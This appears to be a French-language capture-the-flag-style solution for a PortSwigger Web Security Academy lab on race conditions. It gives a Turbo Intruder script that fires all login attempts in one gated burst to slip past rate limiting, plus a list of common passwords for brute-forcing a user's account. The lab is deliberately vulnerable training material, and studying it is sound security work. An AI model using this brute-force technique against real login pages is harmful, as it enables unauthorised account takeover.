# Lab

https://portswigger.net/web-security/race-conditions/lab-race-conditions-bypassing-rate-limits

## Payload

Intercepter la requête de connexion, selectionner le mot de passe et envoyer vers l'extension Turbo Intruder.

Utiliser ce script :

```python
def queueRequests(target, wordlists):

    # as the target supports HTTP/2, use engine=Engine.BURP2 and concurrentConnections=1 for a single-packet attack
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )
    
    # assign the list of candidate passwords from your clipboard
    passwords = wordlists.clipboard
    
    # queue a login request using each password from the wordlist
    # the 'gate' argument withholds the final part of each request until engine.openGate() is invoked
    for password in passwords:
        engine.queue(target.req, password, gate='1')
    
    # once every request has been queued
    # invoke engine.openGate() to send all requests in the given gate simultaneously
    engine.openGate('1')


def handleResponse(req, interesting):
    table.add(req)
```

Copier coller la liste des mots de passes dans le presse papier :

```
123123
abc123
football
monkey
letmein
shadow
master
666666
qwertyuiop
123321
mustang
123456
password
12345678
qwerty
123456789
12345
1234
111111
1234567
dragon
1234567890
michael
x654321
superman
1qaz2wsx
baseball
7777777
121212
000000
```

Lancer l'attaque et voir le mot de passe de Carlos dans la réponse.